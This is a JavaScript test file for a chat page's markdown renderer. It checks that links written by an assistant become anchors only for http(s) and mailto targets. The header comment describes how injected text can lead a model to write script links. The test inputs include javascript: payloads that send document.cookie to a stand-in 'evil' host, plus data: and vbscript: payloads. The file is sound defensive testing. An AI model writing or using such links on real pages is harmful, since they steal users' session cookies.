/* A link the agent writes can only navigate.
 *
 * A model can be led by text it reads -- a web page, a file -- into writing
 * [text](javascript:...), and a link like that runs script in this page when
 * clicked.  Only http(s) and mailto targets become links; anything else is
 * shown as the text it was.  Driven through Chat.handleMessage, as the page
 * renders an assistant message.
 */

const fs = require('fs');
const path = require('path');
const { JSDOM } = require('jsdom');

const CHAT_JS = fs.readFileSync(
  path.join(__dirname, '..', 'static', 'chat.js'), 'utf8');

let failures = 0;
let ran = 0;

function test(name, fn) {
  ran++;
  try {
    fn();
    console.log(`  ok    ${name}`);
  } catch (e) {
    failures++;
    console.log(`  FAIL  ${name}\n        ${e && e.message}`);
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}

/* The rendered message for assistant text *text*. */
function rendered(text) {
  const dom = new JSDOM(
    '<!doctype html><html><body><div id="messages"></div></body></html>',
    { runScripts: 'outside-only' });
  const win = dom.window;
  const pending = [];
  win.setTimeout = (fn) => { pending.push(fn); return pending.length; };
  win.clearTimeout = () => {};
  win.requestAnimationFrame = (fn) => { pending.push(() => fn(0)); return pending.length; };
  win.cancelAnimationFrame = () => {};
  win.console = Object.assign(Object.create(console), { log: () => {} });
  win.eval(CHAT_JS + '\n;window.Chat = Chat;');
  win.Chat.init();
  win.Chat.handleMessage({ type: 'assistant_text', content: text, delta: false });
  for (let g = 0; pending.length && g < 200; g++) pending.shift()();
  const el = win.document.querySelector('.md-rendered');
  assert(el, 'nothing rendered');
  return el;
}

console.log('\nmarkdown links\n');

test('a web link is a link, opening in a new tab', () => {
  const a = rendered('see [the docs](https://example.com/a?b=1&c=2)').querySelector('a');
  assert(a, 'no link');
  assert(a.getAttribute('href') === 'https://example.com/a?b=1&c=2', a.getAttribute('href'));
  assert(a.textContent === 'the docs' && a.target === '_blank'
         && a.rel === 'noopener', a.outerHTML);
  assert(rendered('[x](http://example.com)').querySelector('a'), 'plain http');
  assert(rendered('[x](HTTPS://EXAMPLE.COM)').querySelector('a'), 'scheme in capitals');
});

test('a target with parentheses in it is whole', () => {
  const a = rendered('[Rust](https://en.wikipedia.org/wiki/Rust_(programming_language)) is')
    .querySelector('a');
  assert(a && a.getAttribute('href') === 'https://en.wikipedia.org/wiki/Rust_(programming_language)',
         a ? a.getAttribute('href') : 'no link');
});

test('so is an address', () => {
  assert(rendered('[mail me](mailto:a@example.com)').querySelector('a'), 'no mailto link');
});

test('a script link is not a link: its text, the target in a tooltip', () => {
  for (const href of ["javascript:location='//evil/'+document.cookie",
                      "javascript:fetch('https://evil/'+document.cookie)",
                      'JavaScript:alert(1)',
                      ' javascript:alert(1)',
                      'data:text/html,<script>alert(1)</script>',
                      'vbscript:msgbox(1)']) {
    const el = rendered(`see [docs](${href})`);
    assert(!el.querySelector('a'), `${href}: became a link`);
    assert(!el.querySelector('script'), `${href}: made a script element`);
    const inert = el.querySelector('.md-link-inert');
    assert(inert && inert.textContent === 'docs', `${href}: the text was lost`);
    assert(inert.getAttribute('title') === href, `${href}: tooltip ${inert.getAttribute('title')}`);
  }
});

test('nor is a target without a scheme', () => {
  // A path resolves against this page's own server, where nothing is.
  const el = rendered('[main.rs](src/main.rs)');
  assert(!el.querySelector('a'), 'a relative path became a link');
  assert(el.querySelector('.md-link-inert').textContent === 'main.rs', 'the text was lost');
});

console.log(`\n${ran - failures}/${ran} passed`);
process.exit(failures ? 1 : 0);
